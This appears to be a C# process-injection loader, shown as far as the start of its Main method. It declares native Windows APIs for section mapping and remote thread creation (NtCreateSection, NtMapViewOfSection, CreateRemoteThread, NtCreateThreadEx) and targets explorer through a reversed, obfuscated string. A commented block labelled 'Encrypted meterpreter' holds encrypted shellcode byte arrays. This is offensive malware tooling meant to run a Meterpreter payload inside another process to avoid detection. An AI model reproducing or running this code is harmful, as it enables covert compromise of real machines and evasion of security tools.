using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Process_Injection___CreateRemoteThreat__ntdll__Decrypter
{
    class Program
    {
        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000,
            Wait0 = 0x00000000,
            Wait1 = 0x00000001,
            Wait2 = 0x00000002,
            Wait3 = 0x00000003,
            Wait63 = 0x0000003f,
            Abandoned = 0x00000080,
            AbandonedWait0 = 0x00000080,
            AbandonedWait1 = 0x00000081,
            AbandonedWait2 = 0x00000082,
            AbandonedWait3 = 0x00000083,
            AbandonedWait63 = 0x000000bf,
            UserApc = 0x000000c0,
            KernelApc = 0x00000100,
            Alerted = 0x00000101,
            Timeout = 0x00000102,
            Pending = 0x00000103,
            Reparse = 0x00000104,
            MoreEntries = 0x00000105,
            NotAllAssigned = 0x00000106,
            SomeNotMapped = 0x00000107,
            OpLockBreakInProgress = 0x00000108,
            VolumeMounted = 0x00000109,
            RxActCommitted = 0x0000010a,
            NotifyCleanup = 0x0000010b,
            NotifyEnumDir = 0x0000010c,
            NoQuotasForAccount = 0x0000010d,
            PrimaryTransportConnectFailed = 0x0000010e,
            PageFaultTransition = 0x00000110,
            PageFaultDemandZero = 0x00000111,
            PageFaultCopyOnWrite = 0x00000112,
            PageFaultGuardPage = 0x00000113,
            PageFaultPagingFile = 0x00000114,
            CrashDump = 0x00000116,
            ReparseObject = 0x00000118,
            NothingToTerminate = 0x00000122,
            ProcessNotInJob = 0x00000123,
            ProcessInJob = 0x00000124,
            ProcessCloned = 0x00000129,
            FileLockedWithOnlyReaders = 0x0000012a,
            FileLockedWithWriters = 0x0000012b,

            // Informational
            Informational = 0x40000000,
            ObjectNameExists = 0x40000000,
            ThreadWasSuspended = 0x40000001,
            WorkingSetLimitRange = 0x40000002,
            ImageNotAtBase = 0x40000003,
            RegistryRecovered = 0x40000009,

            // Warning
            Warning = 0x80000000,
            GuardPageViolation = 0x80000001,
            DatatypeMisalignment = 0x80000002,
            Breakpoint = 0x80000003,
            SingleStep = 0x80000004,
            BufferOverflow = 0x80000005,
            NoMoreFiles = 0x80000006,
            HandlesClosed = 0x8000000a,
            PartialCopy = 0x8000000d,
            DeviceBusy = 0x80000011,
            InvalidEaName = 0x80000013,
            EaListInconsistent = 0x80000014,
            NoMoreEntries = 0x8000001a,
            LongJump = 0x80000026,
            DllMightBeInsecure = 0x8000002b,

            // Error
            Error = 0xc0000000,
            Unsuccessful = 0xc0000001,
            NotImplemented = 0xc0000002,
            InvalidInfoClass = 0xc0000003,
            InfoLengthMismatch = 0xc0000004,
            AccessViolation = 0xc0000005,
            InPageError = 0xc0000006,
            PagefileQuota = 0xc0000007,
            InvalidHandle = 0xc0000008,
            BadInitialStack = 0xc0000009,
            BadInitialPc = 0xc000000a,
            InvalidCid = 0xc000000b,
            TimerNotCanceled = 0xc000000c,
            InvalidParameter = 0xc000000d,
            NoSuchDevice = 0xc000000e,
            NoSuchFile = 0xc000000f,
            InvalidDeviceRequest = 0xc0000010,
            EndOfFile = 0xc0000011,
            WrongVolume = 0xc0000012,
            NoMediaInDevice = 0xc0000013,
            NoMemory = 0xc0000017,
            NotMappedView = 0xc0000019,
            UnableToFreeVm = 0xc000001a,
            UnableToDeleteSection = 0xc000001b,
            IllegalInstruction = 0xc000001d,
            AlreadyCommitted = 0xc0000021,
            AccessDenied = 0xc0000022,
            BufferTooSmall = 0xc0000023,
            ObjectTypeMismatch = 0xc0000024,
            NonContinuableException = 0xc0000025,
            BadStack = 0xc0000028,
            NotLocked = 0xc000002a,
            NotCommitted = 0xc000002d,
            InvalidParameterMix = 0xc0000030,
            ObjectNameInvalid = 0xc0000033,
            ObjectNameNotFound = 0xc0000034,
            ObjectNameCollision = 0xc0000035,
            ObjectPathInvalid = 0xc0000039,
            ObjectPathNotFound = 0xc000003a,
            ObjectPathSyntaxBad = 0xc000003b,
            DataOverrun = 0xc000003c,
            DataLate = 0xc000003d,
            DataError = 0xc000003e,
            CrcError = 0xc000003f,
            SectionTooBig = 0xc0000040,
            PortConnectionRefused = 0xc0000041,
            InvalidPortHandle = 0xc0000042,
            SharingViolation = 0xc0000043,
            QuotaExceeded = 0xc0000044,
            InvalidPageProtection = 0xc0000045,
            MutantNotOwned = 0xc0000046,
            SemaphoreLimitExceeded = 0xc0000047,
            PortAlreadySet = 0xc0000048,
            SectionNotImage = 0xc0000049,
            SuspendCountExceeded = 0xc000004a,
            ThreadIsTerminating = 0xc000004b,
            BadWorkingSetLimit = 0xc000004c,
            IncompatibleFileMap = 0xc000004d,
            SectionProtection = 0xc000004e,
            EasNotSupported = 0xc000004f,
            EaTooLarge = 0xc0000050,
            NonExistentEaEntry = 0xc0000051,
            NoEasOnFile = 0xc0000052,
            EaCorruptError = 0xc0000053,
            FileLockConflict = 0xc0000054,
            LockNotGranted = 0xc0000055,
            DeletePending = 0xc0000056,
            CtlFileNotSupported = 0xc0000057,
            UnknownRevision = 0xc0000058,
            RevisionMismatch = 0xc0000059,
            InvalidOwner = 0xc000005a,
            InvalidPrimaryGroup = 0xc000005b,
            NoImpersonationToken = 0xc000005c,
            CantDisableMandatory = 0xc000005d,
            NoLogonServers = 0xc000005e,
            NoSuchLogonSession = 0xc000005f,
            NoSuchPrivilege = 0xc0000060,
            PrivilegeNotHeld = 0xc0000061,
            InvalidAccountName = 0xc0000062,
            UserExists = 0xc0000063,
            NoSuchUser = 0xc0000064,
            GroupExists = 0xc0000065,
            NoSuchGroup = 0xc0000066,
            MemberInGroup = 0xc0000067,
            MemberNotInGroup = 0xc0000068,
            LastAdmin = 0xc0000069,
            WrongPassword = 0xc000006a,
            IllFormedPassword = 0xc000006b,
            PasswordRestriction = 0xc000006c,
            LogonFailure = 0xc000006d,
            AccountRestriction = 0xc000006e,
            InvalidLogonHours = 0xc000006f,
            InvalidWorkstation = 0xc0000070,
            PasswordExpired = 0xc0000071,
            AccountDisabled = 0xc0000072,
            NoneMapped = 0xc0000073,
            TooManyLuidsRequested = 0xc0000074,
            LuidsExhausted = 0xc0000075,
            InvalidSubAuthority = 0xc0000076,
            InvalidAcl = 0xc0000077,
            InvalidSid = 0xc0000078,
            InvalidSecurityDescr = 0xc0000079,
            ProcedureNotFound = 0xc000007a,
            InvalidImageFormat = 0xc000007b,
            NoToken = 0xc000007c,
            BadInheritanceAcl = 0xc000007d,
            RangeNotLocked = 0xc000007e,
            DiskFull = 0xc000007f,
            ServerDisabled = 0xc0000080,
            ServerNotDisabled = 0xc0000081,
            TooManyGuidsRequested = 0xc0000082,
            GuidsExhausted = 0xc0000083,
            InvalidIdAuthority = 0xc0000084,
            AgentsExhausted = 0xc0000085,
            InvalidVolumeLabel = 0xc0000086,
            SectionNotExtended = 0xc0000087,
            NotMappedData = 0xc0000088,
            ResourceDataNotFound = 0xc0000089,
            ResourceTypeNotFound = 0xc000008a,
            ResourceNameNotFound = 0xc000008b,
            ArrayBoundsExceeded = 0xc000008c,
            FloatDenormalOperand = 0xc000008d,
            FloatDivideByZero = 0xc000008e,
            FloatInexactResult = 0xc000008f,
            FloatInvalidOperation = 0xc0000090,
            FloatOverflow = 0xc0000091,
            FloatStackCheck = 0xc0000092,
            FloatUnderflow = 0xc0000093,
            IntegerDivideByZero = 0xc0000094,
            IntegerOverflow = 0xc0000095,
            PrivilegedInstruction = 0xc0000096,
            TooManyPagingFiles = 0xc0000097,
            FileInvalid = 0xc0000098,
            InstanceNotAvailable = 0xc00000ab,
            PipeNotAvailable = 0xc00000ac,
            InvalidPipeState = 0xc00000ad,
            PipeBusy = 0xc00000ae,
            IllegalFunction = 0xc00000af,
            PipeDisconnected = 0xc00000b0,
            PipeClosing = 0xc00000b1,
            PipeConnected = 0xc00000b2,
            PipeListening = 0xc00000b3,
            InvalidReadMode = 0xc00000b4,
            IoTimeout = 0xc00000b5,
            FileForcedClosed = 0xc00000b6,
            ProfilingNotStarted = 0xc00000b7,
            ProfilingNotStopped = 0xc00000b8,
            NotSameDevice = 0xc00000d4,
            FileRenamed = 0xc00000d5,
            CantWait = 0xc00000d8,
            PipeEmpty = 0xc00000d9,
            CantTerminateSelf = 0xc00000db,
            InternalError = 0xc00000e5,
            InvalidParameter1 = 0xc00000ef,
            InvalidParameter2 = 0xc00000f0,
            InvalidParameter3 = 0xc00000f1,
            InvalidParameter4 = 0xc00000f2,
            InvalidParameter5 = 0xc00000f3,
            InvalidParameter6 = 0xc00000f4,
            InvalidParameter7 = 0xc00000f5,
            InvalidParameter8 = 0xc00000f6,
            InvalidParameter9 = 0xc00000f7,
            InvalidParameter10 = 0xc00000f8,
            InvalidParameter11 = 0xc00000f9,
            InvalidParameter12 = 0xc00000fa,
            MappedFileSizeZero = 0xc000011e,
            TooManyOpenedFiles = 0xc000011f,
            Cancelled = 0xc0000120,
            CannotDelete = 0xc0000121,
            InvalidComputerName = 0xc0000122,
            FileDeleted = 0xc0000123,
            SpecialAccount = 0xc0000124,
            SpecialGroup = 0xc0000125,
            SpecialUser = 0xc0000126,
            MembersPrimaryGroup = 0xc0000127,
            FileClosed = 0xc0000128,
            TooManyThreads = 0xc0000129,
            ThreadNotInProcess = 0xc000012a,
            TokenAlreadyInUse = 0xc000012b,
            PagefileQuotaExceeded = 0xc000012c,
            CommitmentLimit = 0xc000012d,
            InvalidImageLeFormat = 0xc000012e,
            InvalidImageNotMz = 0xc000012f,
            InvalidImageProtect = 0xc0000130,
            InvalidImageWin16 = 0xc0000131,
            LogonServer = 0xc0000132,
            DifferenceAtDc = 0xc0000133,
            SynchronizationRequired = 0xc0000134,
            DllNotFound = 0xc0000135,
            IoPrivilegeFailed = 0xc0000137,
            OrdinalNotFound = 0xc0000138,
            EntryPointNotFound = 0xc0000139,
            ControlCExit = 0xc000013a,
            PortNotSet = 0xc0000353,
            DebuggerInactive = 0xc0000354,
            CallbackBypass = 0xc0000503,
            PortClosed = 0xc0000700,
            MessageLost = 0xc0000701,
            InvalidMessage = 0xc0000702,
            RequestCanceled = 0xc0000703,
            RecursiveDispatch = 0xc0000704,
            LpcReceiveBufferExpected = 0xc0000705,
            LpcInvalidConnectionUsage = 0xc0000706,
            LpcRequestsNotAllowed = 0xc0000707,
            ResourceInUse = 0xc0000708,
            ProcessIsProtected = 0xc0000712,
            VolumeDirty = 0xc0000806,
            FileCheckedOut = 0xc0000901,
            CheckOutRequired = 0xc0000902,
            BadFileType = 0xc0000903,
            FileTooLarge = 0xc0000904,
            FormsAuthRequired = 0xc0000905,
            VirusInfected = 0xc0000906,
            VirusDeleted = 0xc0000907,
            TransactionalConflict = 0xc0190001,
            InvalidTransaction = 0xc0190002,
            TransactionNotActive = 0xc0190003,
            TmInitializationFailed = 0xc0190004,
            RmNotActive = 0xc0190005,
            RmMetadataCorrupt = 0xc0190006,
            TransactionNotJoined = 0xc0190007,
            DirectoryNotRm = 0xc0190008,
            CouldNotResizeLog = 0xc0190009,
            TransactionsUnsupportedRemote = 0xc019000a,
            LogResizeInvalidSize = 0xc019000b,
            RemoteFileVersionMismatch = 0xc019000c,
            CrmProtocolAlreadyExists = 0xc019000f,
            TransactionPropagationFailed = 0xc0190010,
            CrmProtocolNotFound = 0xc0190011,
            TransactionSuperiorExists = 0xc0190012,
            TransactionRequestNotValid = 0xc0190013,
            TransactionNotRequested = 0xc0190014,
            TransactionAlreadyAborted = 0xc0190015,
            TransactionAlreadyCommitted = 0xc0190016,
            TransactionInvalidMarshallBuffer = 0xc0190017,
            CurrentTransactionNotValid = 0xc0190018,
            LogGrowthFailed = 0xc0190019,
            ObjectNoLongerExists = 0xc0190021,
            StreamMiniversionNotFound = 0xc0190022,
            StreamMiniversionNotValid = 0xc0190023,
            MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
            CantOpenMiniversionWithModifyIntent = 0xc0190025,
            CantCreateMoreStreamMiniversions = 0xc0190026,
            HandleNoLongerValid = 0xc0190028,
            NoTxfMetadata = 0xc0190029,
            LogCorruptionDetected = 0xc0190030,
            CantRecoverWithHandleOpen = 0xc0190031,
            RmDisconnected = 0xc0190032,
            EnlistmentNotSuperior = 0xc0190033,
            RecoveryNotNeeded = 0xc0190034,
            RmAlreadyStarted = 0xc0190035,
            FileIdentityNotPersistent = 0xc0190036,
            CantBreakTransactionalDependency = 0xc0190037,
            CantCrossRmBoundary = 0xc0190038,
            TxfDirNotEmpty = 0xc0190039,
            IndoubtTransactionsExist = 0xc019003a,
            TmVolatile = 0xc019003b,
            RollbackTimerExpired = 0xc019003c,
            TxfAttributeCorrupt = 0xc019003d,
            EfsNotAllowedInTransaction = 0xc019003e,
            TransactionalOpenNotAllowed = 0xc019003f,
            TransactedMappingUnsupportedRemote = 0xc0190040,
            TxfMetadataAlreadyPresent = 0xc0190041,
            TransactionScopeCallbacksNotSet = 0xc0190042,
            TransactionRequiredPromotion = 0xc0190043,
            CannotExecuteFileInTransaction = 0xc0190044,
            TransactionsNotFrozen = 0xc0190045,

            MaximumNtStatus = 0xffffffff
        }


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
           ref IntPtr section,
           UInt32 desiredAccess,
           IntPtr pAttrs,
           ref long MaxSize,
           uint pageProt,
           uint allocationAttribs,
           IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr RtlCreateUserThread(
            IntPtr processHandle,
            IntPtr threadSecurity,
            bool createSuspended,
            Int32 stackZeroBits,
            IntPtr stackReserved,
            IntPtr stackCommit,
            IntPtr startAddress,
            IntPtr parameter,
            ref IntPtr threadHandle,
            IntPtr clientId);


        [DllImport("ntdll.dll", SetLastError = true)]
        static extern NTSTATUS NtCreateThreadEx(
            ref IntPtr threadHandle,
            UInt32 desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool inCreateSuspended,
            Int32 stackZeroBits,
            Int32 sizeOfStack,
            Int32 maximumStackSize,
            IntPtr attributeList);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {

            
            
            string obfuscatedstringname = "rerolpxe";
            //string obfuscatedstringname = "replehdof";
            string stringname = "";
            /* Encrypted meterpreter */
            /*
            byte[] buf = new byte[610] {
            //    0x03, 0xb7, 0x7c, 0x1b, 0x0f, 0x17, 0x33, 0xff, 0xff, 0xff, 0xbe, 0xae, 0xbe, 0xaf, 0xad, 0xb7, 0xce, 0x2d, 0xae, 0x9a, 0xb7, 0x74, 0xad, 0x9f, 0xb7, 0x74, 0xad, 0xe7, 0xb7, 0x74, 0xad, 0xdf, 0xa9, 0xb7, 0xf0, 0x48, 0xb5, 0xb5, 0xb2, 0xce, 0x36, 0xb7, 0x74, 0x8d, 0xaf, 0xb7, 0xce, 0x3f, 0x53, 0xc3, 0x9e, 0x83, 0xfd, 0xd3, 0xdf, 0xbe, 0x3e, 0x36, 0xf2, 0xbe, 0xfe, 0x3e, 0x1d, 0x12, 0xad, 0xb7, 0x74, 0xad, 0xdf, 0x74, 0xbd, 0xc3, 0xbe, 0xae, 0xb7, 0xfe, 0x2f, 0x99, 0x7e, 0x87, 0xe7, 0xf4, 0xfd, 0xf0, 0x7a, 0x8d, 0xff, 0xff, 0xff, 0x74, 0x7f, 0x77, 0xff, 0xff, 0xff, 0xb7, 0x7a, 0x3f, 0x8b, 0x98, 0xb7, 0xfe, 0x2f, 0xbb, 0x74, 0xbf, 0xdf, 0xaf, 0x74, 0xb7, 0xe7, 0xb6, 0xfe, 0x2f, 0x1c, 0xa9, 0xb2, 0xce, 0x36, 0xb7, 0x00, 0x36, 0xbe, 0x74, 0xcb, 0x77, 0xb7, 0xfe, 0x29, 0xb7, 0xce, 0x3f, 0xbe, 0x3e, 0x36, 0xf2, 0x53, 0xbe, 0xfe, 0x3e, 0xc7, 0x1f, 0x8a, 0x0e, 0xb3, 0xfc, 0xb3, 0xdb, 0xf7, 0xba, 0xc6, 0x2e, 0x8a, 0x27, 0xa7, 0xbb, 0x74, 0xbf, 0xdb, 0xb6, 0xfe, 0x2f, 0x99, 0xbe, 0x74, 0xf3, 0xb7, 0xbb, 0x74, 0xbf, 0xe3, 0xb6, 0xfe, 0x2f, 0xbe, 0x74, 0xfb, 0x77, 0xb7, 0xfe, 0x2f, 0xbe, 0xa7, 0xbe, 0xa7, 0xa1, 0xa6, 0xa5, 0xbe, 0xa7, 0xbe, 0xa6, 0xbe, 0xa5, 0xb7, 0x7c, 0x13, 0xdf, 0xbe, 0xad, 0x00, 0x1f, 0xa7, 0xbe, 0xa6, 0xa5, 0xb7, 0x74, 0xed, 0x16, 0xb4, 0x00, 0x00, 0x00, 0xa2, 0xb7, 0xce, 0x24, 0xac, 0xb6, 0x41, 0x88, 0x96, 0x91, 0x96, 0x91, 0x9a, 0x8b, 0xff, 0xbe, 0xa9, 0xb7, 0x76, 0x1e, 0xb6, 0x38, 0x3d, 0xb3, 0x88, 0xd9, 0xf8, 0x00, 0x2a, 0xac, 0xac, 0xb7, 0x76, 0x1e, 0xac, 0xa5, 0xb2, 0xce, 0x3f, 0xb2, 0xce, 0x36, 0xac, 0xac, 0xb6, 0x45, 0xc5, 0xa9, 0x86, 0x58, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0x17, 0xf1, 0xff, 0xff, 0xff, 0xce, 0xc6, 0xcd, 0xd1, 0xce, 0xc9, 0xc7, 0xd1, 0xce, 0xd1, 0xce, 0xc9, 0xc9, 0xff, 0xa5, 0xb7, 0x76, 0x3e, 0xb6, 0x38, 0x3f, 0x44, 0xfe, 0xff, 0xff, 0xb2, 0xce, 0x36, 0xac, 0xac, 0x95, 0xfc, 0xac, 0xb6, 0x45, 0xa8, 0x76, 0x60, 0x39, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0x17, 0xc7, 0xff, 0xff, 0xff, 0xd0, 0x8e, 0xb5, 0x8f, 0xaa, 0x9e, 0x93, 0xcc, 0x9a, 0xca, 0xca, 0x92, 0xc9, 0x9d, 0xc8, 0x8b, 0x8b, 0xcd, 0xb1, 0x96, 0xa7, 0xcc, 0x98, 0x97, 0xb2, 0xb7, 0xaa, 0x87, 0xb3, 0xa9, 0xc8, 0xb9, 0xa6, 0x85, 0xa0, 0xbe, 0x99, 0xb3, 0x89, 0xb7, 0x87, 0xa0, 0xad, 0x94, 0x86, 0x98, 0xb3, 0xaa, 0xbd, 0xc9, 0xb8, 0xa8, 0xb6, 0x87, 0xa9, 0xff, 0xb7, 0x76, 0x3e, 0xac, 0xa5, 0xbe, 0xa7, 0xb2, 0xce, 0x36, 0xac, 0xb7, 0x47, 0xff, 0xcd, 0x57, 0x7b, 0xff, 0xff, 0xff, 0xff, 0xaf, 0xac, 0xac, 0xb6, 0x38, 0x3d, 0x14, 0xaa, 0xd1, 0xc4, 0x00, 0x2a, 0xb7, 0x76, 0x39, 0x95, 0xf5, 0xa0, 0xb7, 0x76, 0x0e, 0x95, 0xe0, 0xa5, 0xad, 0x97, 0x7f, 0xcc, 0xff, 0xff, 0xb6, 0x76, 0x1f, 0x95, 0xfb, 0xbe, 0xa6, 0xb6, 0x45, 0x8a, 0xb9, 0x61, 0x79, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0xb2, 0xce, 0x3f, 0xac, 0xa5, 0xb7, 0x76, 0x0e, 0xb2, 0xce, 0x36, 0xb2, 0xce, 0x36, 0xac, 0xac, 0xb6, 0x38, 0x3d, 0xd2, 0xf9, 0xe7, 0x84, 0x00, 0x2a, 0x7a, 0x3f, 0x8a, 0xe0, 0xb7, 0x38, 0x3e, 0x77, 0xec, 0xff, 0xff, 0xb6, 0x45, 0xbb, 0x0f, 0xca, 0x1f, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0xb7, 0x00, 0x30, 0x8b, 0xfd, 0x14, 0x55, 0x17, 0xaa, 0xff, 0xff, 0xff, 0xac, 0xa6, 0x95, 0xbf, 0xa5, 0xb6, 0x76, 0x2e, 0x3e, 0x1d, 0xef, 0xb6, 0x38, 0x3f, 0xff, 0xef, 0xff, 0xff, 0xb6, 0x45, 0xa7, 0x5b, 0xac, 0x1a, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0xb7, 0x6c, 0xac, 0xac, 0xb7, 0x76, 0x18, 0xb7, 0x76, 0x0e, 0xb7, 0x76, 0x25, 0xb6, 0x38, 0x3f, 0xff, 0xdf, 0xff, 0xff, 0xb6, 0x76, 0x06, 0xb6, 0x45, 0xed, 0x69, 0x76, 0x1d, 0xff, 0xff, 0xff, 0xff, 0x00, 0x2a, 0xb7, 0x7c, 0x3b, 0xdf, 0x7a, 0x3f, 0x8b, 0x4d, 0x99, 0x74, 0xf8, 0xb7, 0xfe, 0x3c, 0x7a, 0x3f, 0x8a, 0x2d, 0xa7, 0x3c, 0xa7, 0x95, 0xff, 0xa6, 0x44, 0x1f, 0xe2, 0xd5, 0xf5, 0xbe, 0x76, 0x25, 0x00, 0x2a};
            0xaf, 0x3d, 0xf3, 0xd7, 0x82, 0xbb, 0xff, 0x63, 0x72, 0x33, 0x35, 0x02, 0x34, 0x20, 0x61, 0x3a, 0x62, 0xe1, 0x32, 0x17, 0x7b, 0xff, 0x01, 0x15, 0x38, 0xb8, 0x20, 0x4b, 0x7b, 0xe8, 0x20, 0x13, 0x22, 0x1b, 0x7a, 0xc7, 0x79, 0x38, 0x1e, 0x02, 0xaa, 0x3a, 0xb8, 0x06, 0x03, 0x3d, 0x41, 0xf3, 0xde, 0x6f, 0x52, 0x1f, 0x70, 0x1f, 0x54, 0x12, 0xb4, 0xb9, 0x3e, 0x33, 0x52, 0xf2, 0x81, 0x9f, 0x61, 0x3c, 0xd8, 0x27, 0x50, 0xb8, 0x30, 0x6f, 0x72, 0x32, 0x3a, 0x32, 0xa4, 0x35, 0xf4, 0x08, 0x2b, 0x79, 0x51, 0x3c, 0xe6, 0x00, 0x33, 0x74, 0x53, 0xfe, 0xf0, 0xbb, 0x72, 0x53, 0x33, 0x2b, 0xf7, 0xf3, 0x00, 0x34, 0x3d, 0x71, 0xe3, 0x36, 0xd8, 0x73, 0x43, 0x22, 0xb8, 0x3c, 0x4b, 0x3c, 0x71, 0xe3, 0x91, 0x05, 0x7e, 0x52, 0xbb, 0x7b, 0x8b, 0x9a, 0x34, 0xfb, 0x07, 0xfa, 0x1b, 0x32, 0xb5, 0x3a, 0x02, 0xb4, 0x12, 0xb4, 0xb9, 0x3e, 0xde, 0x12, 0x32, 0xa2, 0x4a, 0xd3, 0x01, 0xa2, 0x39, 0x73, 0x7f, 0x56, 0x5b, 0x76, 0x5a, 0xa3, 0x46, 0xac, 0x0b, 0x31, 0xfb, 0x73, 0x56, 0x1a, 0x32, 0xb3, 0x14, 0x72, 0xff, 0x5f, 0x3d, 0x34, 0xb8, 0x32, 0x4f, 0x7a, 0x62, 0xa2, 0x72, 0xff, 0x57, 0xfd, 0x38, 0x32, 0xa2, 0x12, 0x6b, 0x22, 0x2a, 0x6d, 0x2d, 0x09, 0x34, 0x28, 0x72, 0x2b, 0x12, 0x69, 0x2b, 0xf1, 0xdf, 0x54, 0x12, 0x27, 0x8f, 0xd3, 0x2a, 0x12, 0x6a, 0x39, 0x3a, 0xb8, 0x66, 0xba, 0x3e, 0x8f, 0xcc, 0x8d, 0x0e, 0x7b, 0x52, 0xa9, 0x60, 0x3d, 0xed, 0x02, 0x19, 0x5d, 0x1b, 0x3d, 0x56, 0x17, 0x72, 0x72, 0x22, 0x1b, 0xfc, 0x91, 0x7a, 0xb5, 0x91, 0x7f, 0x14, 0x54, 0x34, 0x8b, 0x86, 0x26, 0x23, 0x7b, 0xfb, 0xb2, 0x60, 0x39, 0x3f, 0x02, 0xb4, 0x1e, 0x44, 0xb9, 0x60, 0x21, 0x1a, 0x89, 0x59, 0x24, 0x4a, 0xd3, 0x53, 0x75, 0x70, 0x33, 0x8d, 0x86, 0xdb, 0x6d, 0x72, 0x33, 0x74, 0x62, 0x4c, 0x42, 0x1d, 0x43, 0x65, 0x0b, 0x4d, 0x43, 0x1d, 0x45, 0x65, 0x43, 0x70, 0x69, 0x3a, 0xda, 0xf2, 0x2a, 0xb5, 0xf3, 0xcf, 0x52, 0x75, 0x70, 0x7e, 0x43, 0x9a, 0x60, 0x30, 0x18, 0x30, 0x27, 0x1a, 0xcf, 0x27, 0xba, 0xed, 0x95, 0x33, 0x63, 0x72, 0x33, 0x8b, 0x86, 0x9d, 0x48, 0x33, 0x72, 0x53, 0x1c, 0x12, 0x38, 0x43, 0x21, 0x32, 0x19, 0x43, 0x56, 0x47, 0x66, 0x5e, 0x55, 0x10, 0x04, 0x00, 0x27, 0x47, 0x3e, 0x5a, 0x2a, 0x60, 0x54, 0x0b, 0x3f, 0x7b, 0x21, 0x2b, 0x39, 0x26, 0x04, 0x34, 0x0a, 0x49, 0x3c, 0x33, 0x55, 0x38, 0x25, 0x3d, 0x08, 0x6c, 0x20, 0x38, 0x4a, 0x04, 0x3e, 0x66, 0x36, 0x65, 0x32, 0x27, 0x7a, 0x0a, 0x05, 0x33, 0x2b, 0xfb, 0xf2, 0x27, 0x09, 0x34, 0x28, 0x7e, 0x43, 0x9a, 0x60, 0x2b, 0xca, 0x33, 0x46, 0xfb, 0xf1, 0x70, 0x33, 0x72, 0x53, 0x63, 0x30, 0x21, 0x7a, 0xb3, 0x91, 0x9e, 0x25, 0x1d, 0x49, 0xac, 0xe6, 0x2b, 0xfb, 0xf5, 0x1e, 0x59, 0x2a, 0x38, 0xba, 0x83, 0x39, 0x2c, 0x39, 0x20, 0x5b, 0xf4, 0x60, 0x75, 0x70, 0x7a, 0xfb, 0xb3, 0x59, 0x67, 0x33, 0x6a, 0x3d, 0xe9, 0x00, 0x36, 0xad, 0xf4, 0x53, 0x33, 0x63, 0x72, 0xcc, 0xa1, 0x1e, 0x44, 0xb0, 0x60, 0x28, 0x1b, 0xba, 0x92, 0x3f, 0x02, 0xbd, 0x1e, 0x44, 0xb9, 0x60, 0x21, 0x1a, 0xf4, 0xa1, 0x5f, 0x35, 0x6c, 0x28, 0x8a, 0xa5, 0xb6, 0xb2, 0x26, 0x2c, 0x2b, 0xb5, 0xf2, 0xfc, 0x40, 0x75, 0x70, 0x7a, 0xc8, 0x17, 0xc3, 0x56, 0x92, 0x33, 0x74, 0x53, 0x75, 0x8f, 0xe6, 0x3a, 0xac, 0xfc, 0x17, 0x70, 0xd8, 0xde, 0xbb, 0x20, 0x70, 0x33, 0x72, 0x00, 0x6a, 0x09, 0x32, 0x69, 0x3d, 0xda, 0xa4, 0xb1, 0xd1, 0x62, 0x1a, 0xf4, 0xa3, 0x72, 0x23, 0x74, 0x53, 0x3c, 0xca, 0x6b, 0xd6, 0x00, 0xd6, 0x63, 0x72, 0x33, 0x74, 0xac, 0xa0, 0x38, 0xa0, 0x21, 0x00, 0x7b, 0xea, 0x95, 0x7b, 0xfd, 0xa2, 0x3d, 0xf9, 0xe9, 0x3b, 0x94, 0xf3, 0x63, 0x52, 0x33, 0x74, 0x1a, 0xfc, 0x89, 0x7a, 0xc8, 0x41, 0xa5, 0xea, 0x90, 0x33, 0x74, 0x53, 0x75, 0x8f, 0xe6, 0x3a, 0xd0, 0xf7, 0x43, 0xf7, 0xf3, 0x00, 0xe1, 0x13, 0xfb, 0x34, 0x3a, 0x52, 0xf0, 0xe6, 0xb2, 0x46, 0xa6, 0x0b, 0xb6, 0x28, 0x59, 0x72, 0x0a, 0x88, 0x83, 0x6f, 0x19, 0x7e, 0x12, 0xfc, 0xaa, 0xcc, 0xa7};
            */

